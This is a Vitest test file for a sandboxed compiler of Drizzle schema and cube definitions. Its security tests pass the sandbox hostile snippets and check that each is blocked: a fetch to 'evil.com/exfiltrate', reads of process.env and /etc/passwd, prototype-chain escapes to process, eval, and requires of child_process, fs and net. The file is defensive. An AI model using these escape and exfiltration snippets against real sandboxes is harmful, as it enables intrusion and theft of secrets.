import { createRequire } from 'node:module'
import { afterEach, describe, expect, it, vi } from 'vitest'
import {
  compileCube,
  compileSchema,
  resolveTypecheckWorkerUrl,
  transpileAndExecute,
} from '../src/services/cube-compiler'

const esmRequire = createRequire(import.meta.url)

// Resolve module for sandbox tests — mirrors compileSchema's whitelist
function schemaResolver(specifier: string) {
  if (specifier === 'drizzle-orm') return esmRequire('drizzle-orm')
  if (specifier === 'drizzle-orm/pg-core') return esmRequire('drizzle-orm/pg-core')
  if (specifier === 'drizzle-orm/sqlite-core') return esmRequire('drizzle-orm/sqlite-core')
  throw new Error(`Module '${specifier}' is not allowed in schema files`)
}

// Fast sandbox-only execution (skips TS type-checking)
function sandbox(code: string) {
  return transpileAndExecute(code, schemaResolver)
}

afterEach(() => {
  vi.resetModules()
  vi.doUnmock('node:worker_threads')
})

describe('cube-compiler', () => {
  // ─── Full pipeline (type-check + compile + execute) ───────────

  describe('full compilation', () => {
    it('compiles a sqlite schema with table exports', async () => {
      const result = await compileSchema(`
        import { sqliteTable, text, integer } from 'drizzle-orm/sqlite-core'
        export const users = sqliteTable('users', {
          id: integer('id').primaryKey(),
          name: text('name'),
        })
      `)
      expect(result.errors).toHaveLength(0)
      expect(result.exports.users).toBeDefined()
    })

    it('compiles a pg schema with table exports', async () => {
      const result = await compileSchema(`
        import { pgTable, text, integer } from 'drizzle-orm/pg-core'
        export const products = pgTable('products', {
          id: integer('id').primaryKey(),
          title: text('title'),
        })
      `)
      expect(result.errors).toHaveLength(0)
      expect(result.exports.products).toBeDefined()
    })

    it('compiles multiple table exports', async () => {
      const result = await compileSchema(`
        import { sqliteTable, text, integer } from 'drizzle-orm/sqlite-core'
        export const users = sqliteTable('users', {
          id: integer('id').primaryKey(),
          name: text('name'),
        })
        export const posts = sqliteTable('posts', {
          id: integer('id').primaryKey(),
          title: text('title'),
        })
      `)
      expect(result.errors).toHaveLength(0)
      expect(result.exports.users).toBeDefined()
      expect(result.exports.posts).toBeDefined()
    })

    it('compiles a cube definition importing schemas', async () => {
      const schemaCode = `
        import { sqliteTable, text, integer } from 'drizzle-orm/sqlite-core'
        export const users = sqliteTable('users', {
          id: integer('id').primaryKey(),
          name: text('name'),
        })
      `
      const schemaCompiled = await compileSchema(schemaCode)
      expect(schemaCompiled.errors).toHaveLength(0)

      const result = await compileCube(
        `
        import { defineCube } from 'drizzle-cube/server'
        import { users } from './users'

        export default defineCube('Users', {
          sql: () => ({ from: users }),
          dimensions: {
            id: { name: 'id', sql: users.id, type: 'number', primaryKey: true },
            name: { name: 'name', sql: users.name, type: 'string' },
          },
          measures: {
            count: { name: 'count', type: 'count', sql: users.id },
          },
        })
      `,
        { users: schemaCompiled.exports },
        { users: schemaCode }
      )
      expect(result.errors).toHaveLength(0)
      expect(result.exports.default).toBeDefined()
      expect(result.exports.default.name).toBe('Users')
    })

    it('reports type errors for invalid drizzle usage', async () => {
      const result = await compileSchema(`
        import { sqliteTable, text } from 'drizzle-orm/sqlite-core'
        export const users = sqliteTable('users', {
          id: text('id').nonExistentMethod(),
        })
      `)
      expect(result.errors.length).toBeGreaterThan(0)
    })

    it('reports errors for disallowed module imports', async () => {
      const result = await compileSchema(`
        import * as fs from 'fs'
        export const data = fs.readFileSync('/etc/passwd', 'utf-8')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
    })

    it('uses the JavaScript worker in source runtimes', () => {
      const workerUrl = resolveTypecheckWorkerUrl(
        'file:///tmp/drizby/src/services/cube-compiler.ts'
      )
      expect(workerUrl.pathname).toMatch(/typecheck-worker\.js$/)
    })

    it('reports actionable errors when the worker fails to start', async () => {
      vi.resetModules()
      vi.doMock('node:worker_threads', async () => {
        const actual =
          await vi.importActual<typeof import('node:worker_threads')>('node:worker_threads')

        class ThrowingWorker {
          constructor() {
            throw new Error('boom')
          }
        }

        return {
          ...actual,
          Worker: ThrowingWorker as unknown as typeof actual.Worker,
        }
      })

      const { compileSchema: compileSchemaWithMock } = await import('../src/services/cube-compiler')
      const result = await compileSchemaWithMock('export const users = {}')

      expect(result.errors).toHaveLength(1)
      expect(result.errors[0].message).toMatch(/failed to start/)
      expect(result.errors[0].message).toMatch(/typecheck-worker\.js/)
      expect(result.errors[0].message).toMatch(/boom/)
    })
  })

  // ─── Sandbox isolation (fast, no type-checking) ───────────────

  describe('sandbox blocks dangerous globals', () => {
    it('blocks process.env access', () => {
      const result = sandbox(`
        const secrets=***      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/process/)
    })

    it('blocks process.exit()', () => {
      const result = sandbox(`
        process.exit(1)
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/process/)
    })

    it('blocks fetch()', () => {
      const result = sandbox(`
        fetch('https://evil.com/exfiltrate')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/fetch/)
    })

    it('blocks globalThis.process access', () => {
      const result = sandbox(`
        const p = globalThis.process
        p.exit(1)
      `)
      expect(result.errors.length).toBeGreaterThan(0)
    })

    it('blocks setTimeout', () => {
      const result = sandbox(`
        setTimeout(() => {}, 1000)
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/setTimeout/)
    })

    it('blocks setInterval', () => {
      const result = sandbox(`
        setInterval(() => {}, 1000)
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/setInterval/)
    })

    it('blocks Buffer access', () => {
      const result = sandbox(`
        const b = Buffer.from('data')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/Buffer/)
    })

    // Note: console is provided by V8 in vm contexts and is not a security risk
  })

  describe('sandbox blocks code generation', () => {
    it('blocks eval() inside sandbox', () => {
      const result = sandbox(`
        const x = eval('1+1')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
    })

    it('blocks new Function() inside sandbox', () => {
      const result = sandbox(`
        const fn = new Function('return 1')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
    })
  })

  describe('sandbox blocks prototype chain escapes', () => {
    it('blocks constructor.constructor escape', () => {
      const result = sandbox(`
        const p = ({}).constructor.constructor('return process')()
        p.exit(1)
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/Runtime error/)
    })

    it('blocks __proto__ traversal', () => {
      const result = sandbox(`
        const obj = {}
        const p = obj.__proto__.constructor.constructor('return process')()
      `)
      expect(result.errors.length).toBeGreaterThan(0)
    })
  })

  describe('sandbox timeout', () => {
    it('kills infinite loops', () => {
      const result = sandbox(`
        while (true) {}
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/timed out|Script execution/)
    }, 10000)

    it('kills CPU-intensive loops', () => {
      const result = sandbox(`
        let x = 0
        for (let i = 0; i < 1e18; i++) { x += i }
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/timed out|Script execution/)
    }, 10000)
  })

  describe('module whitelist', () => {
    it('allows drizzle-orm require at runtime', () => {
      const result = sandbox(`
        const orm = require('drizzle-orm/sqlite-core')
        exports.t = orm.sqliteTable('t', { id: orm.text('id') })
      `)
      expect(result.errors).toHaveLength(0)
      expect(result.exports.t).toBeDefined()
    })

    it('blocks require("child_process")', () => {
      const result = sandbox(`
        const cp = require('child_process')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/not allowed/)
    })

    it('blocks require("fs")', () => {
      const result = sandbox(`
        const fs = require('fs')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/not allowed/)
    })

    it('blocks require("net")', () => {
      const result = sandbox(`
        const n = require('net')
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/not allowed/)
    })

    it('blocks dynamic require with string concatenation', () => {
      const result = sandbox(`
        const mod = 'child_' + 'process'
        const cp = require(mod)
      `)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].message).toMatch(/not allowed/)
    })
  })
})
